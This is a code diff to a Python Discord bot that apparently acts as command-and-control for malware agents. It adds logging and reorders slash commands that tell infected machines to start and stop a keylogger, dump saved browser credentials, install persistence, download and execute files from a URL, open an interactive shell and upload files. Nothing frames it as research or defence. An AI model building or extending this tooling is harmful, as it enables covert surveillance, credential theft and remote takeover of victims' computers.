@@ -69,28 +69,36 @@ async def clean_stale_agents():
     guild = bot.get_guild(GUILD_ID)
     if not guild:
         return
+
     agent_channels = [ch for ch in guild.text_channels if ch.name.startswith(AGENT_CHANNEL_PREFIX)]
     now = datetime.now(timezone.utc)
+
     for channel in agent_channels:
         try:
             async for msg in channel.history(limit=10, oldest_first=True):
                 if msg.author == bot.user and "**Last seen:**" in msg.content:
                     match = re.search(r"\*\*Last seen:\*\*\s*([^\n]+)", msg.content)
                     if not match:
+                        logger.info(f"Deleting {channel.name} (no timestamp)")
                         await channel.delete()
                         break
                     timestamp_str = match.group(1).strip()
                     try:
                         last_seen = datetime.fromisoformat(timestamp_str.replace('Z', '+00:00'))
                         if now - last_seen > timedelta(minutes=STALE_THRESHOLD_MINUTES):
+                            logger.info(f"Deleting {channel.name} (stale, last seen {last_seen})")
                             await channel.delete()
-                    except Exception:
+                    except Exception as e:
+                        logger.error(f"Timestamp parse error for {channel.name}: {e}")
                         await channel.delete()
                     break
             else:
+                logger.info(f"Deleting {channel.name} (no heartbeat message)")
                 await channel.delete()
-        except:
-            pass
+        except discord.Forbidden:
+            logger.warning(f"No permission to read history in {channel.name}")
+        except Exception as e:
+            logger.error(f"Error processing {channel.name}: {e}")
 
 @clean_stale_agents.before_loop
 async def before_clean_stale_agents():
@@ -105,6 +113,7 @@ async def on_ready():
         control = discord.utils.get(guild.channels, name=CONTROL_CHANNEL_NAME)
         if not control:
             await guild.create_text_channel(CONTROL_CHANNEL_NAME)
+            logger.info(f"Created #{CONTROL_CHANNEL_NAME} channel")
     clean_stale_agents.start()
 
 # ------------------- HELPER: Send command to agent -------------------
@@ -134,27 +143,7 @@ async def kill_command(interaction: discord.Interaction):
 async def sysinfo_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "sysinfo")
 
-@bot.tree.command(name="keylog_start", description="Start keylogger")
-async def keylog_start_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "keylog_start")
-
-@bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
-async def keylog_stop_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "keylog_stop")
-
-@bot.tree.command(name="creds", description="Dump saved browser credentials")
-async def creds_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "creds")
-
-@bot.tree.command(name="persist", description="Install persistence")
-async def persist_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "persist")
-
-@bot.tree.command(name="unpersist", description="Remove persistence")
-async def unpersist_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "unpersist")
-
-@bot.tree.command(name="download_exec", description="Download a file from URL and execute it")
+@bot.tree.command(name="downloadexec", description="Download a file from URL and execute it")
 async def download_exec_command(interaction: discord.Interaction, url: str, args: str = ""):
     cmd = f"downloadexec {url} {args}".strip()
     await send_command_to_agent(interaction, cmd)
@@ -181,17 +170,22 @@ async def killpid_command(interaction: discord.Interaction, pid: int):
 @bot.tree.command(name="keylog_start", description="Start keylogger")
 async def keylog_start_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "keylog_start")
-@bot.tree.command(name="shell", description="Start an interactive shell session")
-async def shell_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "shell")
-
-@bot.tree.command(name="shell_stop", description="Stop the interactive shell")
-async def shell_stop_command(interaction: discord.Interaction):
-    await send_command_to_agent(interaction, "shell_stop")
 
 @bot.tree.command(name="keylog_stop", description="Stop keylogger and get logs")
 async def keylog_stop_command(interaction: discord.Interaction):
     await send_command_to_agent(interaction, "keylog_stop")
+
+@bot.tree.command(name="creds", description="Dump saved browser credentials")
+async def creds_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "creds")
+
+@bot.tree.command(name="persist", description="Install persistence")
+async def persist_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "persist")
+
+@bot.tree.command(name="unpersist", description="Remove persistence")
+async def unpersist_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "unpersist")
 
 @bot.tree.command(name="upload", description="Upload a file from the agent")
 async def upload_command(interaction: discord.Interaction, path: str):
@@ -200,6 +194,14 @@ async def upload_command(interaction: discord.Interaction, path: str):
 @bot.tree.command(name="download", description="Download a file to the agent")
 async def download_command(interaction: discord.Interaction, url: str, filename: str):
     await send_command_to_agent(interaction, f"download {url} {filename}")
+
+@bot.tree.command(name="shell", description="Start an interactive shell session")
+async def shell_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "shell")
+
+@bot.tree.command(name="shell_stop", description="Stop the interactive shell")
+async def shell_stop_command(interaction: discord.Interaction):
+    await send_command_to_agent(interaction, "shell_stop")
 
 # ------------------- CONTROL CHANNEL COMMANDS (legacy) -------------------
 @bot.command(name="agents")
